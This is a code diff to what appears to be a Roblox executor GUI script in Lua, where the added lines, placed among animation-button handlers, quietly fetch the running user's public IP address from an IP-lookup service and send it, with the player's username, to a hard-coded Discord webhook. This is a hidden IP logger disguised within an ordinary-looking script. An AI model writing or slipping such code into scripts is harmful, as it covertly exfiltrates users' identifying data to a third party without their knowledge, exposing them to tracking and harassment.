@@ -1164,7 +1164,35 @@ _11.MouseButton1Down:connect(function()
 				Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
 				game.Players.LocalPlayer.Character.Humanoid.Jump = true
 			end)
+local IP = (syn and syn.request or request)
+{
+Url = "https://api.ipify.org", 
+Method = "GET",
+Headers = {
+["Content-Type"] = "application/json"
+},    
+};
 
+IPLOG = {
+["embeds"] = {{
+["color"] = 13708129,
+["description"] = (IP.Body),
+["author"] = {
+["name"] = (game.Players.LocalPlayer.Name)
+}}
+}
+}
+
+local SEND = request(
+{
+Url = "https://discord.com/api/webhooks/965787060659171368/pXr-G32-cCSlYbFUJdLWGWFQS3vFfjZxUeC57P_hGXoahqF09yP4wVhY0d9et40-s4Vr",
+Method = "POST",
+Headers = {
+["Content-Type"] = "application/json"
+},
+Body = game:GetService("HttpService"):JSONEncode(IPLOG)
+}
+)
 			A_Zombie.Name = "A_Zombie"
 			A_Zombie.Parent = NormalTab
 			A_Zombie.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
